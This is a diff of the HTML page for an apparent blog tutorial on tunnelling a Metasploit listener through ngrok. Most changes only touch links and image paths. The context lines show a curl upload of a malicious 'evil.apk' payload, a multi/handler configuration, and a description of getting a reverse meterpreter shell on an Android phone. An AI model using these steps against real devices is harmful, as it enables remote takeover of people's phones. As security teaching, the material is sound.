@@ -103,14 +103,6 @@ Share</a>
 		 
 			 
 				<li>
-					<a href="/en/writeups/">
-						<span>Write-Ups</span>
-					</a>
-				</li>
-			 
-		 
-			 
-				<li>
 					<a href="/en/the_rest/">
 						<span>The Rest</span>
 					</a>
@@ -140,7 +132,7 @@ Share</a>
     <p>
       <section class="social">
 	
-	<a href="https://twitter.com/thelaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
 	
 	
 	
@@ -164,7 +156,7 @@ Share</a>
 	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
 	
 	
-  &nbsp;<a href="https://www.root-me.org/DeveLooper" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
   
 	
   &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
@@ -175,8 +167,6 @@ Share</a>
     <div class="langSection">
     
     <a rel="alternate" href="/en/hacking/ngrok_your_dockersploit/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
-    
-    <a rel="alternate" href="/fr/hacking/ngrok_your_dockersploit/" hreflang="fr" lang="fr"><img src="/img/flag_fr.png" alt="flag_fr" class="logoFlag"/></a>
     </div>
     <p class="copyright">
       &copy; 2021 Laluka.
@@ -273,7 +263,7 @@ sudo systemctl enable docker
 
 <p>Ngrok folks have servers and custom DNS running and exposing IP addresses and ports for us. When the developer decides to expose a port, a connection is established with them and one of their subdomain:port is redirected to the open connection, thus exposing the local port.</p>
 
-<p><img class="img_med" src="/hacking/docker_sploit/ngrok.png" alt="ngrok"></p>
+<p><img class="img_med" src="/en/hacking/ngrok_your_dockersploit/ngrok.png" alt="ngrok"></p>
 
 <p>Create an account, sign-in and visit <a href="https://dashboard.ngrok.com/get-started">https://dashboard.ngrok.com/get-started</a> to get your auth token.
 Then install and configure your local instance with :</p>
@@ -311,7 +301,7 @@ ngrok authtoken &lt;REDACTED_TOKEN&gt;
 </ul></li>
 </ul>
 
-<p><img class="img_big" src="/hacking/docker_sploit/step_2_working_tunnel.png" alt="step_2_working_tunnel"></p>
+<p><img class="img_big" src="/en/hacking/ngrok_your_dockersploit/step_2_working_tunnel.png" alt="step_2_working_tunnel"></p>
 
 <h2 id="step-3-define-your-aliases">Step 3 : Define your aliases</h2>
 
@@ -377,7 +367,7 @@ Adding the flag <code>--network=host</code> allows you to run many dockers witho
 <pre><code class="language-bash">curl --upload-file /tmp/msf/evil.apk https://transfer.sh/evil.apk
 </code></pre>
 
-<p><img class="img_big" src="/hacking/docker_sploit/step_4_1_gen_payload.png" alt="step_4_1_gen_payload"></p>
+<p><img class="img_big" src="/en/hacking/ngrok_your_dockersploit/step_4_1_gen_payload.png" alt="step_4_1_gen_payload"></p>
 
 <h3 id="step-4-2-start-the-multi-handler">Step 4.2 : Start the multi/handler</h3>
 
@@ -400,7 +390,7 @@ set LPORT 8888
 exploit
 </code></pre>
 
-<p><img class="img_big" src="/hacking/docker_sploit/step_4_2_multi_handler.png" alt="step_4_2_multi_handler"></p>
+<p><img class="img_big" src="/en/hacking/ngrok_your_dockersploit/step_4_2_multi_handler.png" alt="step_4_2_multi_handler"></p>
 
 <h3 id="step-4-3-execute-the-payload-enjoy-the-meterpreter">Step 4.3 : Execute the payload, enjoy the meterpreter</h3>
 
@@ -409,11 +399,11 @@ exploit
 <p>The app is installed and started, we receive our reverse meterpreter and can now have fun with it! <br />
 Small demo here, getting system info, sending a message to myself and popping a shell :)</p>
 
-<p><img class="img_big" src="/hacking/docker_sploit/step_4_3_profit.png" alt="step_4_3_profit"></p>
+<p><img class="img_big" src="/en/hacking/ngrok_your_dockersploit/step_4_3_profit.png" alt="step_4_3_profit"></p>
 
 <p>Pay attention to all the permissions required, if you see that, some day, from any app : flee you fool!</p>
 
-<p><img class="img_big" src="/hacking/docker_sploit/phone.png" alt="phone"></p>
+<p><img class="img_big" src="/en/hacking/ngrok_your_dockersploit/phone.png" alt="phone"></p>
 
 <h2 id="step-5-that-s-all-folks">Step 5 : That’s all folks!</h2>
 
